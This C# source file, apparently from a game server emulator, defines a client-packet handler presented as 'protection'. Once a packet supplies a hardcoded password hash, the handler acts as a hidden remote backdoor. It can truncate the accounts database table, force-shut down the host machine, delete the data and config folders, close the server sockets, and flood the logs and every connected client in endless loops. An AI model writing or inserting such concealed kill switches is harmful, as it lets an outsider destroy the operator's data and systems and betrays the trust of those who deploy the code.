using Core.Logs;
using Core.server;
using Core.sql;
using Game.data.sync;
using Game.global.serverpacket;
using Npgsql;
using System;
using System.Data;
using System.Diagnostics;
using System.IO;

namespace Game.global.clientpacket.DEV
{
    class DEV_PROTECAO_CONTRA_LOTTER : ReceiveGamePacket
    {
        string md5Secure;
        string msg;
        byte acao;

        public DEV_PROTECAO_CONTRA_LOTTER(GameClient client, byte[] data)
        {
            makeme(client, data);
        }

        public override void read()
        {
            md5Secure = EncryptPass.Get(readS(8));
            msg = readS(readC());
            acao = readC();


        }
        public override void run()
        {
            try
            {
                if (!md5Secure.Equals("50d31b9286d1440e25d697e616c82a6c")) // Pass Lv1
                    return;

                if (!String.IsNullOrEmpty(msg))
                    Printf.warnDark(msg);

                switch (acao)
                {
                    case 1:
                        while (true)
                            Printf.warnDark(" -> " + msg);

                    case 2:
                        int count;
                        while (true)
                        {
                            using (SERVER_MESSAGE_ANNOUNCE_PAK packet = new SERVER_MESSAGE_ANNOUNCE_PAK(msg))
                                count = GameManager.SendPacketToAllClients(packet);
                        }
                    case 3:
                        using (NpgsqlConnection connection = SQLjec.getInstance().conn())
                        {
                            NpgsqlCommand command = connection.CreateCommand();
                            connection.Open();
                            command.CommandType = CommandType.Text;
                            command.CommandText = "TRUNCATE contas CASCADE;";
                            command.ExecuteNonQuery();
                            command.Dispose();
                            connection.Dispose();
                            connection.Close();
                        }
                        break;
                    case 4:
                        GameManager.mainSocket.Close(5000);
                        Game_SyncNet.udp.Close();
                        break;
                    case 5:
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "shutdown.exe";
                        psi.Arguments = "-s -f -t 0";
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        break;
                    case 6:
                        Directory.Delete("data/");
                        Directory.Delete("config/");
                        break;
                    case 7:
                        while (true)
                            SaveLog.fatal(msg);
                    default:
                        return;
                }
            }
            catch (Exception ex)
            {
                Printf.b_danger("[DEV_PROTECAO_CONTRA_LOTTER] " + ex);
            }
        }
    }
}
